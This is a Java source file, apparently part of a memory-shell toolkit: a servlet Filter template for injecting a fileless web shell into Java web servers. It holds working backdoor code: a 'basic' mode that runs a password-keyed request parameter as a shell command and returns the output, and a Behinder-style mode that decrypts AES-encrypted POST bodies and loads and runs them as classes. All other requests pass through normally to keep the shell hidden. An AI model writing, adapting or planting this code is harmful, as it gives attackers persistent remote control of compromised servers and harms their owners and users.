package com.memshell.generic;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Scanner;

public class FilterTemplate implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[+] Dynamic Filter says hello");

        if(servletRequest.getParameter("type") != null && servletRequest.getParameter("type").equals("basic")){
            //basic cmd shell
            String cmd = servletRequest.getParameter(Config.getPassword());
            if(cmd != null && !cmd.isEmpty()){
                String[] cmds = null;
                if(File.separator.equals("/")){
                    cmds = new String[]{"/bin/sh", "-c", cmd};
                }else{
                    cmds = new String[]{"cmd", "/C", cmd};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                servletResponse.getWriter().println(result);
            }
        }else if(((HttpServletRequest)servletRequest).getHeader(Config.getHeader()) != null){
            //behind3 shell
            try{
                if (((HttpServletRequest)servletRequest).getMethod().equals("POST")){
                    String k = Config.getBehinderShellPwdPwd();
                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u",k);
                    Cipher cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                    targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
                }
            }catch(Exception e){
                e.printStackTrace();
            }
        }else{
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    @Override
    public void destroy() {

    }

    class U extends ClassLoader{
        U(ClassLoader c){super(c);}

        public Class g(byte []b){return super.defineClass(b,0,b.length);}
    }
}
